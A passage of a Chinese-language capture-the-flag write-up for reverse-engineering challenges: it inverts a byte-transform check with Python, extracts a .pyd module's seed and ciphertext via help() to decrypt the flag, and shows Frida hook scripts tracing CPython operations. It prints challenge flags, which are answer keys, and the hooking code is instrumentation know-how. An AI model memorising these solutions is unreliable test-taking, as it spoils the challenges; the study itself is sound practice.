class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">input</span>[<span class="hljs-number">2</span>] -= <span class="hljs-number">12</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">26</span>] += <span class="hljs-number">85</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">35</span>] += <span class="hljs-number">12</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">14</span>] -= <span class="hljs-number">9</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">27</span>] += <span class="hljs-number">6</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">6</span>] ^= <span class="hljs-number">5</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">1</span>] ^= <span class="hljs-number">5</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">27</span>] -= <span class="hljs-number">14</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">25</span>] -= <span class="hljs-number">3</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">26</span>] -= <span class="hljs-number">4</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">4</span>] ^= <span class="hljs-number">8</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">3</span>] += <span class="hljs-number">12</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">12</span>] -= <span class="hljs-number">10</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">37</span>] += <span class="hljs-number">2</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">32</span>] += <span class="hljs-number">2</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">9</span>] += <span class="hljs-number">12</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">26</span>] ^= <span class="hljs-number">5</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">4</span>] -= <span class="hljs-number">13</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">8</span>] ^= <span class="hljs-number">15</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">10</span>] -= <span class="hljs-number">14</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">16</span>] += <span class="hljs-number">7</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">12</span>] += <span class="hljs-number">7</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">34</span>] ^= <span class="hljs-number">8</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">21</span>] ^= <span class="hljs-number">10</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">39</span>] += <span class="hljs-number">126</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">7</span>] -= <span class="hljs-number">2</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">15</span>] ^= <span class="hljs-number">3</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">10</span>] ^= <span class="hljs-number">10</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">34</span>] += <span class="hljs-number">11</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">18</span>] -= <span class="hljs-number">8</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">25</span>] -= <span class="hljs-number">9</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">14</span>] ^= <span class="hljs-number">6</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">0</span>] ^= <span class="hljs-number">5</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">10</span>] += <span class="hljs-number">8</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">27</span>] ^= <span class="hljs-number">7</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">13</span>] ^= <span class="hljs-number">6</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">13</span>] ^= <span class="hljs-number">4</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">23</span>] ^= <span class="hljs-number">12</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">34</span>] ^= <span class="hljs-number">14</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">18</span>] -= <span class="hljs-number">52</span><br><span class="hljs-attribute">input</span>[<span class="hljs-number">38</span>] += <span class="hljs-number">119</span><br></code></pre></td></tr></table></figure><p>然后进行简单的逆向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">b&#x27;ciUsfL6&gt;&#125;z1nd].mf00d_ycd0$\xb8P@nd_i3\x89kj2\xf0\xfb&#x27;</span><br><span class="hljs-comment"># 将bytes转换为可修改的列表</span><br>input_data = <span class="hljs-built_in">list</span>(data)<br><br>input_data[<span class="hljs-number">38</span>] -= <span class="hljs-number">119</span><br>input_data[<span class="hljs-number">18</span>] += <span class="hljs-number">52</span><br>input_data[<span class="hljs-number">34</span>] ^= <span class="hljs-number">14</span><br>input_data[<span class="hljs-number">23</span>] ^= <span class="hljs-number">12</span><br>input_data[<span class="hljs-number">13</span>] ^= <span class="hljs-number">4</span><br>input_data[<span class="hljs-number">13</span>] ^= <span class="hljs-number">6</span><br>input_data[<span class="hljs-number">27</span>] ^= <span class="hljs-number">7</span><br>input_data[<span class="hljs-number">10</span>] -= <span class="hljs-number">8</span><br>input_data[<span class="hljs-number">0</span>] ^= <span class="hljs-number">5</span><br>input_data[<span class="hljs-number">14</span>] ^= <span class="hljs-number">6</span><br>input_data[<span class="hljs-number">25</span>] += <span class="hljs-number">9</span><br>input_data[<span class="hljs-number">18</span>] += <span class="hljs-number">8</span><br>input_data[<span class="hljs-number">34</span>] -= <span class="hljs-number">11</span><br>input_data[<span class="hljs-number">10</span>] ^= <span class="hljs-number">10</span><br>input_data[<span class="hljs-number">15</span>] ^= <span class="hljs-number">3</span><br>input_data[<span class="hljs-number">7</span>] += <span class="hljs-number">2</span><br>input_data[<span class="hljs-number">39</span>] -= <span class="hljs-number">126</span><br>input_data[<span class="hljs-number">21</span>] ^= <span class="hljs-number">10</span><br>input_data[<span class="hljs-number">34</span>] ^= <span class="hljs-number">8</span><br>input_data[<span class="hljs-number">12</span>] -= <span class="hljs-number">7</span><br>input_data[<span class="hljs-number">16</span>] -= <span class="hljs-number">7</span><br>input_data[<span class="hljs-number">10</span>] += <span class="hljs-number">14</span><br>input_data[<span class="hljs-number">8</span>] ^= <span class="hljs-number">15</span><br>input_data[<span class="hljs-number">4</span>] += <span class="hljs-number">13</span><br>input_data[<span class="hljs-number">26</span>] ^= <span class="hljs-number">5</span><br>input_data[<span class="hljs-number">9</span>] -= <span class="hljs-number">12</span><br>input_data[<span class="hljs-number">32</span>] -= <span class="hljs-number">2</span><br>input_data[<span class="hljs-number">37</span>] -= <span class="hljs-number">2</span><br>input_data[<span class="hljs-number">12</span>] += <span class="hljs-number">10</span><br>input_data[<span class="hljs-number">3</span>] -= <span class="hljs-number">12</span><br>input_data[<span class="hljs-number">4</span>] ^= <span class="hljs-number">8</span><br>input_data[<span class="hljs-number">26</span>] += <span class="hljs-number">4</span><br>input_data[<span class="hljs-number">25</span>] += <span class="hljs-number">3</span><br>input_data[<span class="hljs-number">27</span>] += <span class="hljs-number">14</span><br>input_data[<span class="hljs-number">27</span>] -= <span class="hljs-number">6</span><br>input_data[<span class="hljs-number">14</span>] += <span class="hljs-number">9</span><br>input_data[<span class="hljs-number">35</span>] -= <span class="hljs-number">12</span><br>input_data[<span class="hljs-number">26</span>] -= <span class="hljs-number">85</span><br>input_data[<span class="hljs-number">2</span>] += <span class="hljs-number">12</span><br>input_data[<span class="hljs-number">6</span>] ^= <span class="hljs-number">5</span><br>input_data[<span class="hljs-number">1</span>] ^= <span class="hljs-number">5</span><br><br>original_input = <span class="hljs-built_in">bytes</span>(input_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Original input:&quot;</span>, original_input)<br><br><span class="hljs-comment"># flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span><br></code></pre></td></tr></table></figure><p>所以最终的 flag 为 <code>flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</code></p><h3 id="moon"><a href="#moon" class="headerlink" title="moon"></a>moon</h3><p>pyd 逆向，扔 ida 之后不难发现这是 python 3.11 写的，所以做题也用相同的 python 版本<br>这次发现了一个很奇妙的方法来做 pyd 的题<br>附件的 main.py </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> moon <br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I tried my best, to live an ordinary life.&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;But I hope you can look up and see the moonlight through reverse engineering on the streets full of sixpence.&quot;</span>)<br><br>user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your flag: &quot;</span>).strip()<br><br>result, error = moon.check_flag(user_input)<br><br><span class="hljs-keyword">if</span> error:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error.&quot;</span>)<br><span class="hljs-keyword">elif</span> result:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I think you have found the right way.&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You seem to be lost.&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后可以在这里面添加一行 <strong>help(moon)</strong><br>运行 main.py,就可以得到很多有用的信息</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust">Help on module moon:<br><br>NAME<br>    moon<br><br>FUNCTIONS<br>    <span class="hljs-title function_ invoke__">check_flag</span>(input_str)<br><br>    <span class="hljs-title function_ invoke__">xor_crypt</span>(seed_value, data_bytes)<br><br>DATA<br>    SEED = <span class="hljs-number">1131796</span><br>    TARGET_HEX = <span class="hljs-string">&#x27;426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1a...</span><br><span class="hljs-string">    __test__ = &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">FILE</span><br><span class="hljs-string">    d:<span class="hljs-char escape_">\c</span>tf<span class="hljs-char escape_">\r</span>everse<span class="hljs-char escape_">\p</span>yd<span class="hljs-char escape_">\m</span>oon<span class="hljs-char escape_">\m</span>oon.pyd</span><br></code></pre></td></tr></table></figure><p>从这里就可以直接看到关键函数和关键数据，TARGET_HEX 是密文，xor_crypt 是加密函数，而其中传入的 seed_value 应该就是下面的 SEED<br>因此直接修改 main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> moon <br><span class="hljs-keyword">from</span> moon <span class="hljs-keyword">import</span> xor_crypt, TARGET_HEX, SEED<br>flag= xor_crypt(SEED, TARGET_HEX)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>运行发现有报错，TARGET_HEX 是一个字符串，需要转换成字节数据<br>稍作修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> moon<br><span class="hljs-keyword">from</span> moon <span class="hljs-keyword">import</span> xor_crypt, TARGET_HEX, SEED<br><span class="hljs-keyword">import</span> binascii<br>target_bytes = binascii.unhexlify(TARGET_HEX)<br><span class="hljs-comment"># 或者用 target_bytes = bytes.fromhex(TARGET_HEX)</span><br>flag= xor_crypt(SEED, target_bytes)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>直接运行打印出 flag<br><img src="/../images/XYCTF2025/m1.png"><br>flag 即为 <code>flag&#123;but_y0u_l00k3d_up_@t_th3_mOOn&#125;</code></p><p>除了这种做法外，我依旧尝试了之前的方法<br>main.py 中加个 import os 和 print(os.getpid()),以便 ida attach 到 process 进行动调<br>frida hook 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rand0m_more.js&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    jscode = f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span>, message)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        device = frida.get_local_device()<br>    <br>        <span class="hljs-comment"># target = input(&quot;Enter PID or process name: &quot;).strip()</span><br>        target = <span class="hljs-number">31112</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            pid = <span class="hljs-built_in">int</span>(target)<br>            session = device.attach(pid)<br>        <span class="hljs-keyword">except</span> ValueError:<br>            session = device.attach(target)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Attached to <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)<br>        <br>        script = session.create_script(jscode)<br>        script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>        script.load()<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Script loaded. Monitoring Python operations...&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Press Ctrl+C to stop and analyze.\n&quot;</span>)<br>        <br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                time.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] Stopping trace and analyzing...&quot;</span>)<br>            script.exports.stop()<br>            time.sleep(<span class="hljs-number">2</span>)  <br>        <br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] Exiting...&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>js 脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// rand0m_more.js</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Python Crypto Trace Script Started&quot;</span>);<br><br><span class="hljs-keyword">var</span> hook_list = [<br>    <span class="hljs-string">&quot;PyNumber_Add&quot;</span>, <span class="hljs-string">&quot;PyNumber_And&quot;</span>, <span class="hljs-string">&quot;PyNumber_Rshift&quot;</span>, <span class="hljs-string">&quot;PyNumber_Lshift&quot;</span>,<br>    <span class="hljs-string">&quot;PyNumber_Xor&quot;</span>, <span class="hljs-string">&quot;PyNumber_InPlaceRshift&quot;</span>, <span class="hljs-string">&quot;PyNumber_InPlaceAdd&quot;</span>,<br>    <span class="hljs-string">&quot;PyNumber_Multiply&quot;</span>, <span class="hljs-string">&quot;PyNumber_Power&quot;</span>, <span class="hljs-string">&quot;PyNumber_Index&quot;</span>,<br>    <span class="hljs-string">&quot;PyObject_RichCompare&quot;</span>, <span class="hljs-string">&quot;PyNumber_Remainder&quot;</span><br>];<br><br><span class="hljs-comment">// 全局变量用于跟踪执行流程</span><br><span class="hljs-keyword">var</span> callSequence = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">var</span> traceData = [];<br><span class="hljs-keyword">var</span> isTracing = <span class="hljs-literal">true</span>;<br><br><span class="hljs-comment">// 兼容的 findExportByName 函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">findExportByName</span>(<span class="hljs-params">moduleName, exportName</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Module</span>.<span class="hljs-property">findExportByName</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(moduleName, exportName);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Module</span>.<span class="hljs-property">getExportByName</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(moduleName, exportName);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Module</span>.<span class="hljs-property">getGlobalExportByName</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (moduleName === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getGlobalExportByName</span>(exportName);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>                <span class="hljs-keyword">const</span> <span class="hljs-built_in">exports</span> = <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">exports</span>.<span class="hljs-property">length</span>; i++) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">exports</span>[i].<span class="hljs-property">name</span> === exportName) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-built_in">exports</span>[i].<span class="hljs-property">address</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">// 优化的 Python 长整型解析</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">parsePyLong</span>(<span class="hljs-params">addr</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (!addr || addr.<span class="hljs-title function_">isNull</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">const</span> ob_size = addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x10</span>).<span class="hljs-title function_">readS64</span>();<br>        <span class="hljs-keyword">if</span> (ob_size === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-keyword">const</span> isNegative = ob_size &lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> numdigits = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(<span class="hljs-title class_">Number</span>(ob_size));<br>        <br>        <span class="hljs-keyword">if</span> (numdigits &gt; <span class="hljs-number">0x1000</span>) &#123;<br>            <span class="hljs-keyword">const</span> digit = addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x18</span>).<span class="hljs-title function_">readU32</span>();<br>            <span class="hljs-keyword">return</span> isNegative ? -digit : digit;<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (numdigits &gt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">let</span> bigVal = <span class="hljs-number">0n</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numdigits; i++) &#123;<br>                <span class="hljs-keyword">const</span> digit = addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x18</span> + <span class="hljs-number">4</span> * i).<span class="hljs-title function_">readU32</span>();<br>                bigVal += <span class="hljs-title class_">BigInt</span>(digit) * (<span class="hljs-number">1n</span> &lt;&lt; (<span class="hljs-number">30n</span> * <span class="hljs-title class_">BigInt</span>(i)));<br>            &#125;<br>            <span class="hljs-keyword">return</span> isNegative ? -bigVal : bigVal;<br>        &#125;<br>        <br>        <span class="hljs-keyword">let</span> val = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numdigits; i++) &#123;<br>            val += addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x18</span> + <span class="hljs-number">4</span> * i).<span class="hljs-title function_">readU32</span>() * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">30</span> * i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> isNegative ? -val : val;<br>        <br>    &#125; <span class="hljs-keyword">catch</span> (e) 